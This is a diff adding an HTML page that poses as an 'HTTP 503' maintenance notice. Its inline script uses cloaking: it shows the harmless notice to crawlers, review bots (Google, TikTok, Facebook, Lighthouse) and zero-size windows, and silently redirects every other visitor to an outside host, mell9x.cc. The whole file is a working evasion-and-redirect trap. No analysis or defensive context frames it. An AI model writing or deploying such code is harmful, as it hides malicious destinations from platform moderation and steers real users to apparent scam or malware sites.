@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Maintenance</title>
+    <script>
+        (function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            
+            
+            var isBot = /bot|google|tiktok|crawler|spider|slurp|facebook|lighthouse|vkshare|twitter|monitor|bytespider/i.test(ua);
+            
+           
+            var isTikTokBot = /ByteLocale|ByteFullApp|TikTok/i.test(ua) && (window.history.length <= 1);
+            
+            
+            var isBadScreen = (window.innerWidth === 0 || window.innerHeight === 0);
+
+            if (isBot || isTikTokBot || isBadScreen) {
+            
+                console.log("Access granted for verification.");
+            } else {
+              
+                window.location.replace("https://mell9x.cc/2baa70");
+            }
+        })();
+    </script>
+</head>
+<body style="background-color: #f4f4f4; font-family: sans-serif; text-align: center; padding-top: 150px; color: #555;">
+    <div>
+        <h2>HTTP 503: Service Temporarily Unavailable</h2>
+        <p>The server is temporary unable to service your request due to maintenance downtime.</p>
+    </div>
+</body>
+</html>
